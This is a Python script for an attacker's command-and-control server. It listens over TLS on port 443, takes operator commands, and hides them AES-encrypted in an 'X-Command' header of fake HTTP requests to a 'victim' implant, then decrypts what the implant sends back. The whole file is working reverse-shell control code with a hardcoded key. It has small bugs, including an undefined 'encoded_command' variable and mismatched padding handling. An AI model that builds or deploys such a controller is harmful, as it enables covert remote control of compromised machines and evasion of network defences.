import ssl
import socket
import binascii
from Crypto.Cipher import AES

# Configuration
host = '0.0.0.0'
port = 443
certfile = 'attacker.crt'
keyfile = 'attacker.key'

# AES configuration
aes_key = bytes([0x2b, 0x7e, 0x15, 0x16, 0x28, 0x6d, 0x29, 0x58, 0x41, 0x60, 0x74, 0x5c, 0x3e, 0x7b, 0x71, 0x3a])  # Key from C program
aes_iv = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f])  # IV from C program

def decrypt_aes_cbc(encrypted_hex):
    """Decrypt the AES CBC encrypted data (hex) back to plaintext."""
    try:
        encrypted_data = binascii.unhexlify(encrypted_hex)  # Convert hex to bytes
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)  # Create AES cipher
        decrypted_data = cipher.decrypt(encrypted_data)  # Decrypt
        return decrypted_data.rstrip(b'\x00').decode('utf-8')  # Remove padding and decode to string
    except Exception as e:
        return f"Decryption error: {e}"
        
def pad(data):
    """Pad data to be a multiple of AES block size."""
    padding_length = AES.block_size - len(data) % AES.block_size
    return data + bytes([padding_length] * padding_length)  # Add padding

def unpad(data):
    """Remove padding from data (PKCS7)."""
    padding_length = data[-1]
    if padding_length < 1 or padding_length > AES.block_size:
        raise ValueError("Invalid padding length")
    
    # Ensure the padding length matches the number of padding bytes
    if data[-padding_length:] != bytes([padding_length] * padding_length):
        raise ValueError("Incorrect padding")
    
    return data[:-padding_length]  # Remove the padding

def encrypt_aes_cbc(plaintext):
    """Encrypt the plaintext using AES-CBC."""
    try:
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        padded_plaintext = pad(plaintext.encode())
        encrypted_data = cipher.encrypt(padded_plaintext)
        return binascii.hexlify(encrypted_data).decode()  # Convert to hex string
    except Exception as e:
        return f"Encryption error: {e}"

def extract_body_from_response(response):
    """Extract the body from the HTTP response."""
    body_start = response.find('\r\n\r\n')
    if body_start != -1:
        return response[body_start + 4:]
    return None

def receive_full_response(conn):
    """Receive the full response from the server based on Content-Length."""
    response_data = b""
    
    # Read the header to determine Content-Length
    while b"\r\n\r\n" not in response_data:  # Look for the end of headers
        chunk = conn.recv(4096)
        if not chunk:
            break
        response_data += chunk

    headers, body = response_data.split(b"\r\n\r\n", 1)
    headers_str = headers.decode('utf-8', errors='ignore')

    # Parse Content-Length
    content_length = 0
    for line in headers_str.split("\r\n"):
        if line.lower().startswith("content-length:"):
            content_length = int(line.split(":")[1].strip())
            break

    # Receive the body based on Content-Length
    while len(body) < content_length:
        chunk = conn.recv(4096)
        if not chunk:
            break
        body += chunk

    return headers.decode('utf-8', errors='ignore') + "\r\n\r\n" + body.decode('utf-8', errors='ignore')
    
def start_server():
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        sock.bind((host, port))
        sock.listen(5)

        with context.wrap_socket(sock, server_side=True) as ssock:
            print(f"[*] Listening on {host}:{port}")

            while True:
                conn, addr = ssock.accept()
                print(f"[+] Connection from {addr}")

                try:
                    while True:
                        command = input("Enter command to send (or 'exit' to close connection): ")
                        if command.strip().lower() == "exit":
                            print("[*] Closing connection...")
                            conn.close()
                            break

                        if not command.strip():
                            print("[-] Empty command. Skipping...")
                            continue
                        
                        # Encrypt the command
                        encrypted_command = encrypt_aes_cbc(command)
                        print(f"[+] Encrypted command: {encrypted_command}")
                        
                        http_request = (
                            f"POST / HTTP/1.1\r\n"
                            f"Host: victim\r\n"
                            f"X-Command: {encrypted_command}\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Content-Length: 0\r\n\r\n"
                        )
                        conn.sendall(http_request.encode())
                        print(f"[+] Sent command: {encoded_command}")

                        response = receive_full_response(conn)  # Receive full response
                        print(f"[+] Received response:\n{response}")

                        body = extract_body_from_response(response)
                        if body:
                            decrypted_response = decrypt_aes_cbc(body)
                            print(f"[+] Decrypted response:\n{decrypted_response}")
                        else:
                            print("[-] No body found in response.")
                except Exception as e:
                    print(f"[-] Error: {e}")
                finally:
                    conn.close()

if __name__ == "__main__":
    start_server()
